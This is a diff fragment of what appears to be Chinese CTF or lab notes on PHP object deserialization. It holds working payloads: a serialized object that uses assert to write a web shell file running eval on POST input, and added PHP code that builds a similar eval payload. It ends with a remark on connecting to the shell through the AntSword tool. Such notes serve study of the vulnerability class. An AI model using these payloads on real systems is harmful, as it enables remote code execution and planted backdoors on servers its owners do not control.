@@ -45,3 +45,25 @@
 ```php
 O:4:"Test":2:{s:1:"p";s:57:"file_put_contents('abc.php','<?=eval($_POST["cmd"]);?>');";s:4:"func";s:6:"assert";}
 ```
+也可以像这样：
+```php
+<?php
+class Test {
+    var $p = "Y-m-d h:i:s a";
+    var $func = "date";
+
+}
+
+$test = new Test();
+
+
+$test->func="assert";
+$test->p='eval($_POST["1"]);';
+
+
+echo serialize($test);
+```
+但是这样只有一次呀，当时可以执行，这咋连接。。。
+后面了解了一下，蚁剑可以直接设置发包的参数，直接连接就好了
+
+# 
